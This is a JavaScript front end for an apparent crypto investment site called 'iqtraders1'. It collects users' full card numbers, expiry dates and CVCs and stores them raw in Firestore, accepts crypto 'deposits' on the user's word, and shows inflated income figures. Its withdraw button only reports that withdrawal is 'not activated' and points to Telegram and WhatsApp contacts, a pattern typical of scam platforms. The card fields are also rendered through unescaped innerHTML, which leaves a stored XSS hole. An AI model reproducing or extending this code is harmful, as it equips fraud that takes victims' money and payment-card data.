// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-analytics.js";
import {
  getAuth,
  onAuthStateChanged,
} from "https://www.gstatic.com/firebasejs/11.6.0/firebase-auth.js";
import {
  getFirestore,
  getDoc,
  doc,
  updateDoc,
} from "https://www.gstatic.com/firebasejs/11.6.0/firebase-firestore.js";
import { validateAsset, cancelPop } from "./validate.js";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyASg5UlPTgE0HH-iM3HRfeMSY2a2Noa3o4",
  authDomain: "iqtraders1.firebaseapp.com",
  projectId: "iqtraders1",
  storageBucket: "iqtraders1.firebasestorage.app",
  messagingSenderId: "538849101252",
  appId: "1:538849101252:web:ffbbd7906c267ce7231091",
  measurementId: "G-J7LYXPLFWF",
};

const logUser = localStorage.getItem("logId");
const popMessage = document.getElementById("confirmation-popup");
const newCardBtn = document.getElementById("new-card");
const newDepositBtn = document.getElementById("new-deposit");
const walletBalance = document.getElementById("crypto-balance");
const walletId = document.getElementById("wallet-id");
const cardDetailsDiv = document.getElementById("card-details");
const bonusIncome = document.getElementById("bonus-income");
const totalIncome = document.getElementById("total-income");
const incomePercent = document.getElementById("income-percent");
const withdrawBtn = document.getElementById("withdraw-btn");

let successIcon = `<dotlottie-player
  src="https://lottie.host/16dbd64b-ed86-44e4-9084-d3bcf3aa5c1c/VoqLrrvykV.lottie"
  background="transparent"
  speed="0.6"
  style="width: auto; height: 300px"
  autoplay
></dotlottie-player>`;

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const auth = getAuth();
const db = getFirestore();

onAuthStateChanged(auth, (user) => {
  if (logUser) {
    const docRef = doc(db, "users", logUser);

    getDoc(docRef)
      .then((docSnap) => {
        if (docSnap.exists()) {
          const userData = docSnap.data();
          walletBalance.innerHTML = `$${Math.floor(userData.Balance)}.00`;
          walletId.innerHTML = `<span> Wallet Id: </span> ${logUser.slice(
            0,
            10
          )}`;
          renderCardDetails(userData);
          bonusIncome.innerHTML = `$${Math.floor(userData.Bonus)}.00`;
          let totalIncomeAmount = 0;
          totalIncomeAmount +=
            Math.floor(userData.Balance) +
            Math.floor(userData.Bonus) +
            Math.floor(userData.Profit_Balance) +
            Math.floor(userData.Investment_Balance);
          let checkPercent = (totalIncomeAmount * 10) / 100;
          totalIncome.innerHTML = `$${totalIncomeAmount}.00`;
          incomePercent.innerHTML = `+${checkPercent > 0 ? checkPercent : 0}%`;

          // NewCardBtn
          newCardBtn.addEventListener("click", () => {
            popMessage.style.display = "flex";
            popMessage.innerHTML = `
          <div class="relative animation-container-p deposit-div pt-short">
          <div class="cancel-sign-btn" id="cancel-sign-btn"><span>&#10005;</span></div>
            <div id="new-card-div" class="relative deposit-w">
            <form id="new-card-form">
            <h4 class="text-center deposit-form-header">Fill Out Wallet Detail</h4>
              <div class="form-group deposit-input">
                <label class="f-thick">Card Number</label>
                <input
                  type="number"
                  class="form-control"
                  placeholder="XXXX XXXX XXXX XXXX"
                  id="card-number"
                  max="16" min="16"
                  pattern="[0-9]*"
                  required
                />
              </div>
              <div class="form-group deposit-input">
                <label class="f-thick">Card Date</label>
                <input
                  type="number"
                  class="form-control"
                  placeholder="01/27"
                  id="card-date"
                  max="4" min="4"
                  pattern="[0-9]*"
                  required
                />
              </div>
              <div class="form-group deposit-input">
                <label class="f-thick">Card CVC</label>
                <input
                  type="number"
                  class="form-control"
                  placeholder="575"
                  id="card-cvc"
                  max="3" min="3"
                  pattern="[0-9]*"
                  required
                />
              </div>
              <div class="form-group deposit-input">
                <label class="f-thick">Card Name</label>
                <input
                  type="text"
                  class="form-control"
                  placeholder="Wallet 1"
                  id="card-name"
                  required
                />
              </div>
              <div class="form-group deposit-input">
                <label class="f-thick">Card Holder</label>
                <input
                  type="text"
                  class="form-control"
                  placeholder="John Doe"
                  id="card-holder"
                  pattern="[A-Za-z]*" 
                  title="Only letters are allowed"
                  min="2" max="50"
                  required
                />
              </div>
              <div class="form-group deposit-input">
                <label class="f-thick">Bank Name</label>
                <input
                  type="text"
                  class="form-control"
                  placeholder="American Express"
                  id="card-bank"
                  pattern="[A-Za-z]*" 
                  title="Only letters are allowed"
                  min="2" max="50"
                  required
                />
              </div>
              <div class="form-group deposit-input">
                <label class="f-thick">Card Type</label>
                <input
                  type="text"
                  class="form-control"
                  placeholder="Visa, American Express etc"
                  id="card-type"
                  pattern="[A-Za-z]*" 
                  title="Only letters are allowed"
                  min="2" max="50"
                  required
                />
              </div>
              <div class="text-center mt-4">
                <br />
                <button
                  type="submit"
                  class="btn btn-primary btn-block w-full"
                  id="new-card-submit"
                >
                  <i class="fa-solid fa-circle-plus"></i> Add Card
                </button>
              </div>
            </form>
          </div>
        </div>
        `;

            const cancelBtn = document.getElementById("cancel-sign-btn");
            cancelPop(cancelBtn, popMessage);

            const newCardDetails = document.getElementById("new-card-submit");
            newCardDetails.addEventListener("click", (e) => {
              e.preventDefault();
              const cardNumber = document.getElementById("card-number").value;
              const cardHolder = document.getElementById("card-holder").value;
              const cardCVC = document.getElementById("card-cvc").value;
              const cardName = document.getElementById("card-name").value;
              const cardDate = document.getElementById("card-date").value;
              const cardType = document.getElementById("card-type").value;
              const cardBank = document.getElementById("card-bank").value;

              const updateCardData = {
                cardCVC,
                cardDate,
                cardName,
                cardHolder,
                cardNumber,
                cardBank,
                cardType,
              };
              if (
                cardCVC === "" ||
                cardDate === "" ||
                cardHolder === "" ||
                cardName === "" ||
                cardNumber === "" ||
                cardBank === "" ||
                cardType === ""
              ) {
                popMessage.style.display = "flex";
                popMessage.innerHTML = `
          <div class="animation-container-p">
          <div class="x-mark-wrapper">
              <svg class="x-mark" viewBox="0 0 52 52">
                  <path d="M16 16 36 36M36 16 16 36" />
              </svg>
              <div class="text-wrapper">
                  <p>Fill out Parameters!</p>
              </div>
            </div>
            </div>
          `;
                setTimeout(() => {
                  popMessage.innerHTML = "";
                  popMessage.style.display = "none";
                }, 3500);
              } else {
                let cards = userData.Card;
                let updateData = {
                  Card: cards,
                };
                cards.push(updateCardData);
                updateDoc(docRef, updateData);
                newCardSuccessful("New Card Added Successfully!");
              }
            });
          });
        }
        newDepositBtn.addEventListener("click", () => {
          popMessage.style.display = "flex";
          popMessage.innerHTML = `
            <div class="relative animation-container-p deposit-div">
              <div class="cancel-sign-btn" id="cancel-sign-btn"><span>&#10005;</span></div>
              <div class="deposit-w">
                <form>
                  <div class="deposit-form-header">Make New Deposit</div>
                  <div class="form-control deposit-input">
                    <select id="select-asset">
                      <option value="" disabled selected>Select a Digital Currency</option>
                      <option value="BTC">BITCOIN</option>
                      <option value="BNB">BNB</option>
                      <option value="ETH">ETHEREUM</option>
                      <option value="USDT">USDT</option>
                      <option value="SOL">SOLANA</option>
                    </select>
                  </div>
                  <div id="asset-network"></div>
                  <div class="relative" id="asset-address"></div>
                  <div class="form-control deposit-input">
                    <label for="deposit-address">Enter Deposit Address</label>
                    <input 
                    type="text" 
                    id="deposit-wallet-id"
                    placeholder="Transfer Address"
                    required
                    /> 
                  </div>
                  <div class="form-btn">
                    <button type="submit" class="btn btn-primary" id="confirm-deposit">
                    Confirm Payment 
                      <span class="deposit-icon">
                        <i class="fa-solid fa-circle-check"></i>
                      </span>
                    </button>
                  </div>
                </form>
              </div> 
            </div>
                `;

          const assetNetwork = document.getElementById("asset-network");
          const assetAddress = document.getElementById("asset-address");
          const cancelBtn = document.getElementById("cancel-sign-btn");
          cancelPop(cancelBtn, popMessage);
          validateAsset(assetNetwork, assetAddress);

          const confirmDeposit = document.getElementById("confirm-deposit");
          confirmDeposit.addEventListener("click", (e) => {
            e.preventDefault();
            const walletId = document.getElementById("deposit-wallet-id");
            if (walletId.value === "") {
              popMessage.style.display = "flex";
              popMessage.innerHTML = `
          <div class="animation-container-p">
          <div class="x-mark-wrapper">
              <svg class="x-mark" viewBox="0 0 52 52">
                  <path d="M16 16 36 36M36 16 16 36" />
              </svg>
              <div class="text-wrapper">
                  <p>Fill out Parameters!</p>
              </div>
            </div>
            </div>
          `;
              setTimeout(() => {
                popMessage.innerHTML = "";
                popMessage.style.display = "none";
              }, 3500);
            } else {
              if (window.confirm("Have you made the payment?")) {
                let updateData = {
                  depositWallet: walletId.value,
                };
                updateDoc(docRef, updateData);
                newCardSuccessful("Deposit Successful!");
              } else {
                alert("Deposit Cancelled!");
              }
            }
          });
        });
      })
      .catch((error) => {
        console.error("Error getting document:", error);
      });
  }
});

function newCardSuccessful(message) {
  popMessage.style.display = "flex";
  popMessage.innerHTML = `
        <div class="animation-container-p">
        <div class="checkmark-wrapper-p">
        ${successIcon}
        <div class="text-wrapper">
        <p>${message}</p>
        </div>
        </div> 
        </div>
        `;

  setTimeout(() => {
    popMessage.innerHTML = "";
    popMessage.style.display = "none";
    window.location.reload();
  }, 7000);
}

function renderCardDetails(userData) {
  let html = "";
  userData.Card.forEach((card) => {
    html += `
      <ul>
          <li>
            <div class="f14-regular text-Black">
              Card name
            </div>
            <div class="f14-bold text-Black">
              ${card.cardName}
            </div>
          </li>
          <li>
            <div class="f14-regular text-Black">
              Valid Date
            </div>
            <div class="f14-bold text-Black">${card.cardDate.slice(
              0,
              2
            )}/${card.cardDate.slice(2, 4)}</div>
          </li>
          <li>
            <div class="f14-regular text-Black">
              Card Number
            </div>
            <div class="f14-bold text-Black">
              **** **** ${card.cardNumber.slice(8, 12)} ${card.cardNumber.slice(
      12,
      16
    )}
            </div>
          </li>
          <li>
            <div class="f14-regular text-Black">
              Bank Name
            </div>
            <div class="f14-bold text-Black">
              ${card.cardBank}
            </div>
          </li>
          <li>
            <div class="f14-regular text-Black">
              Card Type
            </div>
            <div class="f14-bold text-Black">
              ${card.cardType}
            </div>
          </li>
          <li>
            <div class="f14-regular text-Black">
              Card Holder
            </div>
            <div class="f14-bold text-Black">
              ${card.cardHolder}
            </div>
          </li>
      </ul>
      <br />
      <br />
      <br />
      <br />
      <br />
  `;
  });

  cardDetailsDiv.innerHTML = html;
}

withdrawBtn.addEventListener("click", () => {
  popMessage.style.display = "flex";
  popMessage.innerHTML = `
  <div class="relative animation-container-p ">
  <div class="cancel-sign-btn" id="cancel-sign-btn"><span>&#10005;</span></div>
    <div class="icon-wrapper">
      <svg class="notification-icon" viewBox="0 0 52 52">
        <path d="M26 6.3a19.5 19.5 0 0 1 13.8 33.2c.1 2.3-1.9 4-4.1 4H16.3c-2.2 0-4.2-1.7-4.1-4a19.5 19.5 0 0 1 13.8-33.2z"/>
          <path d="M26 17.5v10.5"/>
          <path d="M26 39.5a3.5 3.5 0 1 1 0-7 3.5 3.5 0 0 1 0 7z"/>
      </svg>
      <div class="text-wrapper text-center">
          <p>Withdrawal not activated!</p>
          <p>Contact our support team at 
            <p class="text admin-icon">
              <a
                href="https://t.me/Trader_Martinezan01 "
                target="_blank"
              >
                <i class="fa-brands fa-telegram"></i>
              </a>
              <a href="https://wa.link/tkkvm1" target="_blank">
                <i class="fa-brands fa-whatsapp"></i>
              </a>
            </p>
          </p>
      </div>
    </div>
  </div>
`;

  const cancelBtn = document.getElementById("cancel-sign-btn");
  cancelPop(cancelBtn, popMessage);
});
